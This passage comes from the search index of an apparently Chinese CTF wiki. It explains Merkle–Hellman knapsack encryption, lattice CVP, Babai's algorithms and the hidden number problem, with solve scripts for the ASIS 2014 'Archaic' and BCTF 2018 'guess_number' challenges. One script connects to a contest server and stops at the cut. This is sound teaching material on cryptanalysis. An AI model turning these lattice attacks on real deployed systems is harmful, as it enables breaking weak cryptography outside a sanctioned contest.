\u8fd9\u91cc\u867d\u7136\u8bf4\u4e86\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u8bf4\u662f\u5982\u4f55\u751f\u6210\u7684\u3002","title":"\u80cc\u5305\u95ee\u9898"},{"location":"crypto/asymmetric/knapsack/knapsack/#merklehellman","text":"","title":"Merkle\u2013Hellman"},{"location":"crypto/asymmetric/knapsack/knapsack/#_3","text":"","title":"\u516c\u79c1\u94a5\u751f\u6210"},{"location":"crypto/asymmetric/knapsack/knapsack/#_4","text":"\u79c1\u94a5\u5c31\u662f\u6211\u4eec\u7684\u521d\u59cb\u7684\u80cc\u5305\u96c6\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u600e\u4e48\u751f\u6210\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe a_1=1 a_1=1 \uff0c\u90a3\u4e48 a_2 a_2 \u5927\u4e8e 1 \u5373\u53ef\uff0c\u7c7b\u4f3c\u7684\u53ef\u4ee5\u4f9d\u6b21\u751f\u6210\u540e\u9762\u7684\u503c\u3002","title":"\u751f\u6210\u79c1\u94a5"},{"location":"crypto/asymmetric/knapsack/knapsack/#_5","text":"\u5728\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4e3b\u8981\u4f7f\u7528\u4e86\u6a21\u4e58\u7684\u8fd0\u7b97\u3002 \u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u6a21\u4e58\u7684\u6a21\u6570 m\uff0c\u8fd9\u91cc\u8981\u786e\u4fdd m>\\sum_{i=1}^{i=n}a_i m>\\sum_{i=1}^{i=n}a_i \u5176\u6b21\uff0c\u6211\u4eec\u9009\u62e9\u6a21\u4e58\u7684\u4e58\u6570 w\uff0c\u4f5c\u4e3a\u79c1\u94a5\u5e76\u4e14\u786e\u4fdd gcd(w,m)=1 gcd(w,m)=1 \u4e4b\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u751f\u6210\u516c\u94a5 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5e76\u5c06\u8fd9\u4e2a\u65b0\u7684\u80cc\u5305\u96c6 b_i b_i \u548c m \u4f5c\u4e3a\u516c\u94a5\u3002","title":"\u751f\u6210\u516c\u94a5"},{"location":"crypto/asymmetric/knapsack/knapsack/#_6","text":"","title":"\u52a0\u89e3\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_7","text":"\u5047\u8bbe\u6211\u4eec\u8981\u52a0\u5bc6\u7684\u660e\u6587\u4e3a v\uff0c\u5176\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e3a v_i v_i \uff0c\u90a3\u4e48\u6211\u4eec\u52a0\u5bc6\u7684\u7ed3\u679c\u4e3a \\sum_{i=1}^{i=n}b_iv_i \\bmod m \\sum_{i=1}^{i=n}b_iv_i \\bmod m","title":"\u52a0\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_8","text":"\u5bf9\u4e8e\u89e3\u5bc6\u65b9\uff0c\u9996\u5148\u53ef\u4ee5\u6c42\u7684 w \u5173\u4e8e m \u7684\u9006\u5143 w^{-1} w^{-1} \u3002 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4e58\u4ee5 w^{-1} w^{-1} \u5373\u53ef\u5f97\u5230\u660e\u6587\uff0c\u8fd9\u662f\u56e0\u4e3a \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \\sum_{i=1}^{i=n}w^{-1}b_iv_i \\bmod m=\\sum_{i=1}^{i=n}a_iv_i \\bmod m \u8fd9\u91cc\u6709 b_i \\equiv w a_i \\bmod m b_i \\equiv w a_i \\bmod m \u5bf9\u4e8e\u6bcf\u4e00\u5757\u7684\u52a0\u5bc6\u7684\u6d88\u606f\u90fd\u662f\u5c0f\u4e8e m \u7684\uff0c\u6240\u4ee5\u6c42\u5f97\u7ed3\u679c\u81ea\u7136\u4e5f\u5c31\u662f\u660e\u6587\u4e86\u3002","title":"\u89e3\u5bc6"},{"location":"crypto/asymmetric/knapsack/knapsack/#_9","text":"\u8be5\u52a0\u5bc6\u4f53\u5236\u5728\u63d0\u51fa\u540e\u4e24\u5e74\u540e\u8be5\u4f53\u5236\u5373\u88ab\u7834\u8bd1\uff0c\u7834\u8bd1\u7684\u57fa\u672c\u601d\u60f3\u662f\u6211\u4eec\u4e0d\u4e00\u5b9a\u8981\u627e\u51fa\u6b63\u786e\u7684\u4e58\u6570 w\uff08\u5373\u9677\u95e8\u4fe1\u606f\uff09\uff0c\u53ea\u9700\u627e\u51fa\u4efb\u610f\u6a21\u6570 m\u2032 \u548c\u4e58\u6570 w\u2032 \uff0c\u53ea\u8981\u4f7f\u7528 w\u2032 \u53bb\u4e58\u516c\u5f00\u7684\u80cc\u5305\u5411\u91cf B \u65f6\uff0c\u80fd\u591f\u4ea7\u751f\u8d85\u9012\u589e\u7684\u80cc\u5305\u5411\u91cf\u5373\u53ef\u3002","title":"\u7834\u89e3"},{"location":"crypto/asymmetric/knapsack/knapsack/#_10","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2014 \u5e74 ASIS Cyber Security Contest Quals \u4e2d\u7684 Archaic \u4e3a\u4f8b\uff0c \u9898\u76ee\u94fe\u63a5 \u3002 \u9996\u5148\u67e5\u770b\u6e90\u7a0b\u5e8f secret = 'CENSORED' msg_bit = bin ( int ( secret . encode ( 'hex' ), 16 ))[ 2 :] \u9996\u5148\u5f97\u5230\u4e86 secret \u7684\u6240\u6709\u4e8c\u8fdb\u5236\u4f4d\u3002 \u5176\u6b21\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u5f97\u5230 keypair\uff0c\u5305\u542b\u516c\u94a5\u4e0e\u79c1\u94a5\u3002 keyPair = makeKey ( len ( msg_bit )) \u4ed4\u7ec6\u5206\u6790 makekey \u51fd\u6570\uff0c\u5982\u4e0b def makeKey ( n ): privKey = [ random . randint ( 1 , 4 ** n )] s = privKey [ 0 ] for i in range ( 1 , n ): privKey . append ( random . randint ( s + 1 , 4 ** ( n + i ))) s += privKey [ i ] q = random . randint ( privKey [ n - 1 ] + 1 , 2 * privKey [ n - 1 ]) r = random . randint ( 1 , q ) while gmpy2 . gcd ( r , q ) != 1 : r = random . randint ( 1 , q ) pubKey = [ r * w % q for w in privKey ] return privKey , q , r , pubKey \u53ef\u4ee5\u770b\u51fa prikey \u662f\u4e00\u4e2a\u8d85\u9012\u589e\u5e8f\u5217\uff0c\u5e76\u4e14\u5f97\u5230\u7684 q \u6bd4 prikey \u4e2d\u6240\u6709\u6570\u7684\u548c\u8fd8\u8981\u5927\uff0c\u6b64\u5916\u6211\u4eec\u5f97\u5230\u7684 r\uff0c\u6070\u597d\u4e0e q \u4e92\u7d20\uff0c\u8fd9\u4e00\u5207\u90fd\u8868\u660e\u4e86\u8be5\u52a0\u5bc6\u662f\u4e00\u4e2a\u80cc\u5305\u52a0\u5bc6\u3002 \u679c\u7136\u52a0\u5bc6\u51fd\u6570\u5c31\u662f\u5bf9\u4e8e\u6d88\u606f\u7684\u6bcf\u4e00\u4f4d\u4e58\u4ee5\u5bf9\u5e94\u7684\u516c\u94a5\u5e76\u6c42\u548c\u3002 def encrypt ( msg , pubKey ): msg_bit = msg n = len ( pubKey ) cipher = 0 i = 0 for bit in msg_bit : cipher += int ( bit ) * pubKey [ i ] i += 1 return bin ( cipher )[ 2 :] \u5bf9\u4e8e\u7834\u89e3\u7684\u811a\u672c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 GitHub \u4e0a\u7684\u811a\u672c\u3002\u8fdb\u884c\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\u3002 import binascii # open the public key and strip the spaces so we have a decent array fileKey = open ( \"pub.Key\" , 'rb' ) pubKey = fileKey . read () . replace ( ' ' , '' ) . replace ( 'L' , '' ) . strip ( '[]' ) . split ( ',' ) nbit = len ( pubKey ) # open the encoded message fileEnc = open ( \"enc.txt\" , 'rb' ) encoded = fileEnc . read () . replace ( 'L' , '' ) print \"start\" # create a large matrix of 0's (dimensions are public key length +1) A = Matrix ( ZZ , nbit + 1 , nbit + 1 ) # fill in the identity matrix for i in xrange ( nbit ): A [ i , i ] = 1 # replace the bottom row with your public key for i in xrange ( nbit ): A [ i , nbit ] = pubKey [ i ] # last element is the encoded message A [ nbit , nbit ] = - int ( encoded ) res = A . LLL () for i in range ( 0 , nbit + 1 ): # print solution M = res . row ( i ) . list () flag = True for m in M : if m != 0 and m != 1 : flag = False break if flag : print i , M M = '' . join ( str ( j ) for j in M ) # remove the last bit M = M [: - 1 ] M = hex ( int ( M , 2 ))[ 2 : - 1 ] print M \u8f93\u51fa\u4e4b\u540e\u518d\u89e3\u7801\u4e0b 295 [ 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ] 415349535 f3962643364356664323432323638326331393536383830366130373036316365 >>> import binascii >>> binascii . unhexlify ( '415349535f3962643364356664323432323638326331393536383830366130373036316365' ) 'ASIS_9bd3d5fd2422682c19568806a07061ce' \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5f97\u5230\u7684 LLL \u653b\u51fb\u5f97\u5230\u7684\u77e9\u9635 res \u7684\u53ea\u5305\u542b 01 \u503c\u7684\u884c\u624d\u662f\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\uff0c\u56e0\u4e3a\u6211\u4eec\u5bf9\u4e8e\u660e\u6587\u52a0\u5bc6\u65f6\uff0c\u4f1a\u5c06\u5176\u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u6bd4\u7279\u4e32\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u53bb\u6389\u5bf9\u5e94\u54ea\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u3002 flag \u662f ASIS_9bd3d5fd2422682c19568806a07061ce \u3002","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/knapsack/knapsack/#_11","text":"2017 \u56fd\u8d5b classic","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/lattice/cvp/","text":"CVP \u00b6 CVP\u662fLattice-based cryptography\u4e2d\u5c24\u4e3a\u91cd\u8981\u7684\u4e00\u4e2a\u95ee\u9898\u3002 \u95ee\u9898\u7684\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff1a\u7ed9\u5b9a\u683c L L \u7684\u4e00\u7ec4\u57fa\u4e0e\u5411\u91cf \\mathbf{v} \\mathbf{v} \uff0c\u627e\u5230\u5728 L L \u4e0a\u79bb \\mathbf{v} \\mathbf{v} \u6700\u8fd1\u7684\u4e00\u4e2a\u5411\u91cf\u3002 Algorithms \u00b6 Babai's nearest plane algorithm \u00b6 \u8be5\u7b97\u6cd5\u8f93\u5165\u4e00\u7ec4\u683c L L (\u79e9\u4e3a n n )\u7684\u57fa B B \u548c\u4e00\u4e2a\u76ee\u6807\u5411\u91cf \\mathbf{t} \\mathbf{t} \uff0c\u8f93\u51faCVP\u95ee\u9898\u7684\u8fd1\u4f3c\u89e3\u3002 \u8fd1\u4f3c\u56e0\u5b50\u4e3a \\gamma = 2^{\\frac{n}{2}} \\gamma = 2^{\\frac{n}{2}} \u5177\u4f53\u7b97\u6cd5\uff1a \u5176\u4e2d c_j c_j \u4e3aGram-schmidt\u6b63\u4ea4\u5316\u4e2d\u7684\u7cfb\u6570\u53d6\u6574\uff0c\u4e5f\u5373 proj_{b_{j}}(b) proj_{b_{j}}(b) \u7684\u53d6\u6574\u3002 \u5bf9\u4e8e\u8be5\u7b97\u6cd5\u7b2c\u4e8c\u6b65\u7684\u4e2a\u4eba\u7406\u89e3\uff1a\u5728\u683c\u57fa\u89c4\u7ea6\u548c\u6b63\u4ea4\u5316\u8fc7\u540e\u7684\u57fa B B \u4e2d\u627e\u5230\u4e00\u4e2a\u6700\u9760\u8fd1 \\mathbf{t} \\mathbf{t} \u7684\u7ebf\u6027\u7ec4\u5408\u3002 Babai\u2019s Rounding Technique \u00b6 \u8be5\u7b97\u6cd5\u662f Babai's nearest plane algorithm \u7684\u4e00\u4e2a\u53d8\u79cd\u3002 \u6b65\u9aa4\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a N = rank(B), w = target - B' = LLL(B) - Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i). * (b'_i is the i-th vector in the LLL-reduced basis B') - Round each l_i to it's closest integer l'_i. - Result v = sum(l'_i * b'_i) \u76f8\u5173\u5185\u5bb9 \u00b6 Hidden number problem \u00b6 HNP\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \u7ed9\u5b9a\u8d28\u6570 p p \u3001\u8bb8\u591a t \\in \\mathbb{F}_p t \\in \\mathbb{F}_p \u4ee5\u53ca\u6bcf\u4e00\u4e2a\u5bf9\u5e94\u7684 MSB_{l,p}(\\alpha t) MSB_{l,p}(\\alpha t) \uff0c\u627e\u51fa\u5bf9\u5e94\u7684 \\alpha \\alpha \u3002 MSB_{l,p}(x) MSB_{l,p}(x) \u8868\u793a\u4efb\u4e00\u6ee1\u8db3 \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \u7684\u6574\u6570 u u \uff0c\u8fd1\u4f3c\u4e3a\u53d6 x \\mod p x \\mod p \u7684 l l \u4e2a\u6700\u9ad8\u6709\u6548\u4f4d\u3002 \u6839\u636e\u53c2\u80033\u4e2d\u7684\u63cf\u8ff0\uff0c\u5f53 l \\approx \\log^{\\frac{1}{2}}{p} l \\approx \\log^{\\frac{1}{2}}{p} \u65f6\uff0c\u6709\u5982\u4e0b\u7b97\u6cd5\u53ef\u4ee5\u89e3\u51b3HNP\uff1a \u6211\u4eec\u53ef\u4ee5\u5c06\u6b64\u95ee\u9898\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7531\u8be5\u77e9\u9635\u751f\u6210\u7684\u683c\u4e0a\u7684CVP\u95ee\u9898\uff1a \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] \u6211\u4eec\u9700\u8981\u627e\u5230\u5728\u683c\u4e0a\u79bb \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) \u6700\u8fd1\u7684\u5411\u91cf\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528 Babai's nearest plane algorithm \u3002\u6700\u7ec8\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4e00\u7ec4\u5411\u91cf \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1}}) \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1}}) \uff0c\u4ece\u800c\u7b97\u51fa \\alpha \\alpha \u3002 BCTF 2018 - guess_number \u00b6 \u9898\u76ee\u63d0\u4f9b\u4e86\u670d\u52a1\u5668\u7aef\u7684\u4ee3\u7801\uff1a import random , sys from flag import FLAG import gmpy2 def msb ( k , x , p ): delta = p >> ( k + 1 ) ui = random . randint ( x - delta , x + delta ) return ui def main (): p = gmpy2 . next_prime ( 2 ** 160 ) for _ in range ( 5 ): alpha = random . randint ( 1 , p - 1 ) # print(alpha) t = [] u = [] k = 10 for i in range ( 22 ): t . append ( random . randint ( 1 , p - 1 )) u . append ( msb ( k , alpha * t [ i ] % p , p )) print ( str ( t )) print ( str ( u )) guess = raw_input ( 'Input your guess number: ' ) guess = int ( guess ) if guess != alpha : exit ( 0 ) if __name__ == \"__main__\" : main () print ( FLAG ) \u53ef\u4ee5\u770b\u5230\uff0c\u7a0b\u5e8f\u4e00\u5171\u6267\u884c5\u8f6e\u3002\u5728\u6bcf\u4e00\u8f6e\uff0c\u7a0b\u5e8f\u4f1a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u7684 \\alpha \\alpha \u548c22\u4e2a\u968f\u673a\u7684 t_i t_i \u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2a t_i t_i \uff0c\u7a0b\u5e8f\u4f1a\u53d6 u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) \uff0c\u968f\u540e\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u6211\u4eec\u9700\u8981\u6839\u636e\u63d0\u4f9b\u7684 t_i t_i \u548c u_i u_i \u8ba1\u7b97\u51fa\u5bf9\u5e94\u7684 \\alpha \\alpha \u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8be5\u95ee\u9898\u662f\u4e00\u4e2a\u5178\u578b\u7684Hidden number problem\uff0c\u4e8e\u662f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u8ff0\u7b97\u6cd5\u89e3\u51b3\uff1a import socket import ast import telnetlib #HOST, PORT = 'localhost', 9999 HOST , PORT = '60.205.223.220' , 9999 s = socket . socket () s . connect (( HOST , PORT )) f = s . makefile ( 'rw' , 0 ) def recv_until ( f , delim = ' \\n ' ): buf = '' while not buf . endswith ( delim ): buf += f . read ( 1 ) return buf p = 1461501637330902918203684832716283019655932542983 k = 10 def solve_hnp ( t , u ): # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf M = Matrix ( RationalField (), 23 , 23 ) for i in xrange ( 22 ): M [ i , i ] = p M [ 22 , i ] = t [ i ] M [ 22 , 22 ] = 1 / ( 2 ** ( k + 1 )) def babai ( A , w ): A = A . LLL ( delta = 0.75 ) G = A . gram_schmidt ()[ 0 ] t = w for i in reversed ( range ( A . nrows ())): c = (( t * G [ i ]) / ( G [ i ] * G [ i ])) . round () t -= A [ i ] * c return w - t closest = babai ( M , vector ( u + [ 0 ])) return ( closest [ - 1 ] * ( 2 ** ( k + 1 ))) % p for i in xrange ( 5 ): t = ast . literal_eval ( f . readline () . strip ()) u = ast . literal_eval ( f . readline () . strip ()) alpha = solve_hnp ( t , u ) recv_until ( f , 'number: ' ) s . send ( str ( alpha ) + ' \\n ' ) t = telnetlib . Telnet () t . sock = s t . interact () \u53c2\u8003 \u00b6 Lecture 3 - CVP algorithm Wikipedia Playing \u201cHide-and-Seek\u201d in Finite Fields: Hidden Number Problem and Its Applications https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch18.pdf","title":"CVP"},{"location":"crypto/asymmetric/lattice/cvp/#cvp","text":"CVP\u662fLattice-based cryptography\u4e2d\u5c24\u4e3a\u91cd\u8981\u7684\u4e00\u4e2a\u95ee\u9898\u3002 \u95ee\u9898\u7684\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff1a\u7ed9\u5b9a\u683c L L \u7684\u4e00\u7ec4\u57fa\u4e0e\u5411\u91cf \\mathbf{v} \\mathbf{v} \uff0c\u627e\u5230\u5728 L L \u4e0a\u79bb \\mathbf{v} \\mathbf{v} \u6700\u8fd1\u7684\u4e00\u4e2a\u5411\u91cf\u3002","title":"CVP"},{"location":"crypto/asymmetric/lattice/cvp/#algorithms","text":"","title":"Algorithms"},{"location":"crypto/asymmetric/lattice/cvp/#babais-nearest-plane-algorithm","text":"\u8be5\u7b97\u6cd5\u8f93\u5165\u4e00\u7ec4\u683c L L (\u79e9\u4e3a n n )\u7684\u57fa B B \u548c\u4e00\u4e2a\u76ee\u6807\u5411\u91cf \\mathbf{t} \\mathbf{t} \uff0c\u8f93\u51faCVP\u95ee\u9898\u7684\u8fd1\u4f3c\u89e3\u3002 \u8fd1\u4f3c\u56e0\u5b50\u4e3a \\gamma = 2^{\\frac{n}{2}} \\gamma = 2^{\\frac{n}{2}} \u5177\u4f53\u7b97\u6cd5\uff1a \u5176\u4e2d c_j c_j \u4e3aGram-schmidt\u6b63\u4ea4\u5316\u4e2d\u7684\u7cfb\u6570\u53d6\u6574\uff0c\u4e5f\u5373 proj_{b_{j}}(b) proj_{b_{j}}(b) \u7684\u53d6\u6574\u3002 \u5bf9\u4e8e\u8be5\u7b97\u6cd5\u7b2c\u4e8c\u6b65\u7684\u4e2a\u4eba\u7406\u89e3\uff1a\u5728\u683c\u57fa\u89c4\u7ea6\u548c\u6b63\u4ea4\u5316\u8fc7\u540e\u7684\u57fa B B \u4e2d\u627e\u5230\u4e00\u4e2a\u6700\u9760\u8fd1 \\mathbf{t} \\mathbf{t} \u7684\u7ebf\u6027\u7ec4\u5408\u3002","title":"Babai's nearest plane algorithm"},{"location":"crypto/asymmetric/lattice/cvp/#babais-rounding-technique","text":"\u8be5\u7b97\u6cd5\u662f Babai's nearest plane algorithm \u7684\u4e00\u4e2a\u53d8\u79cd\u3002 \u6b65\u9aa4\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a N = rank(B), w = target - B' = LLL(B) - Find a linear combination [l_0, ... l_N] such that w = sum(l_i * b'_i). * (b'_i is the i-th vector in the LLL-reduced basis B') - Round each l_i to it's closest integer l'_i. - Result v = sum(l'_i * b'_i)","title":"Babai\u2019s Rounding Technique"},{"location":"crypto/asymmetric/lattice/cvp/#_1","text":"","title":"\u76f8\u5173\u5185\u5bb9"},{"location":"crypto/asymmetric/lattice/cvp/#hidden-number-problem","text":"HNP\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \u7ed9\u5b9a\u8d28\u6570 p p \u3001\u8bb8\u591a t \\in \\mathbb{F}_p t \\in \\mathbb{F}_p \u4ee5\u53ca\u6bcf\u4e00\u4e2a\u5bf9\u5e94\u7684 MSB_{l,p}(\\alpha t) MSB_{l,p}(\\alpha t) \uff0c\u627e\u51fa\u5bf9\u5e94\u7684 \\alpha \\alpha \u3002 MSB_{l,p}(x) MSB_{l,p}(x) \u8868\u793a\u4efb\u4e00\u6ee1\u8db3 \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \\lvert (x \\mod p) - u \\rvert \\le \\frac{p}{2^{l+1}} \u7684\u6574\u6570 u u \uff0c\u8fd1\u4f3c\u4e3a\u53d6 x \\mod p x \\mod p \u7684 l l \u4e2a\u6700\u9ad8\u6709\u6548\u4f4d\u3002 \u6839\u636e\u53c2\u80033\u4e2d\u7684\u63cf\u8ff0\uff0c\u5f53 l \\approx \\log^{\\frac{1}{2}}{p} l \\approx \\log^{\\frac{1}{2}}{p} \u65f6\uff0c\u6709\u5982\u4e0b\u7b97\u6cd5\u53ef\u4ee5\u89e3\u51b3HNP\uff1a \u6211\u4eec\u53ef\u4ee5\u5c06\u6b64\u95ee\u9898\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7531\u8be5\u77e9\u9635\u751f\u6210\u7684\u683c\u4e0a\u7684CVP\u95ee\u9898\uff1a \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] \\left[ \\begin{matrix} p & 0 & \\dots & 0 & 0 \\\\ 0 & p & \\ddots & \\vdots & \\vdots \\\\ \\vdots & \\ddots & \\ddots & 0 & \\vdots \\\\ 0 & 0 & \\dots & p & 0 \\\\ t_1 & t_2 & \\dots & t_{n} & \\frac{1}{2^{l+1}} \\end{matrix} \\right] \u6211\u4eec\u9700\u8981\u627e\u5230\u5728\u683c\u4e0a\u79bb \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) \\mathbf{u}=(u_1, u_2, \\dots, u_{n}, 0) \u6700\u8fd1\u7684\u5411\u91cf\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528 Babai's nearest plane algorithm \u3002\u6700\u7ec8\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4e00\u7ec4\u5411\u91cf \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1}}) \\mathbf{v}=(\\alpha \\cdot t_1 \\mod p, \\alpha \\cdot t_2 \\mod p, \\dots, \\frac{\\alpha}{2^{l+1}}) \uff0c\u4ece\u800c\u7b97\u51fa \\alpha \\alpha \u3002","title":"Hidden number problem"},{"location":"crypto/asymmetric/lattice/cvp/#bctf-2018-guess_number","text":"\u9898\u76ee\u63d0\u4f9b\u4e86\u670d\u52a1\u5668\u7aef\u7684\u4ee3\u7801\uff1a import random , sys from flag import FLAG import gmpy2 def msb ( k , x , p ): delta = p >> ( k + 1 ) ui = random . randint ( x - delta , x + delta ) return ui def main (): p = gmpy2 . next_prime ( 2 ** 160 ) for _ in range ( 5 ): alpha = random . randint ( 1 , p - 1 ) # print(alpha) t = [] u = [] k = 10 for i in range ( 22 ): t . append ( random . randint ( 1 , p - 1 )) u . append ( msb ( k , alpha * t [ i ] % p , p )) print ( str ( t )) print ( str ( u )) guess = raw_input ( 'Input your guess number: ' ) guess = int ( guess ) if guess != alpha : exit ( 0 ) if __name__ == \"__main__\" : main () print ( FLAG ) \u53ef\u4ee5\u770b\u5230\uff0c\u7a0b\u5e8f\u4e00\u5171\u6267\u884c5\u8f6e\u3002\u5728\u6bcf\u4e00\u8f6e\uff0c\u7a0b\u5e8f\u4f1a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u7684 \\alpha \\alpha \u548c22\u4e2a\u968f\u673a\u7684 t_i t_i \u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2a t_i t_i \uff0c\u7a0b\u5e8f\u4f1a\u53d6 u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) u_i = MSB_{10,p}(\\alpha\\cdot{t_i\\mod{p}}) \uff0c\u968f\u540e\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\u6211\u4eec\u9700\u8981\u6839\u636e\u63d0\u4f9b\u7684 t_i t_i \u548c u_i u_i \u8ba1\u7b97\u51fa\u5bf9\u5e94\u7684 \\alpha \\alpha \u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8be5\u95ee\u9898\u662f\u4e00\u4e2a\u5178\u578b\u7684Hidden number problem\uff0c\u4e8e\u662f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u8ff0\u7b97\u6cd5\u89e3\u51b3\uff1a import socket import ast import telnetlib #HOST, PORT = 'localhost', 9999 HOST , PORT = '60.205.223.220' , 9999 s = socket . socket () s . connect (( HOST , PORT )) f = s 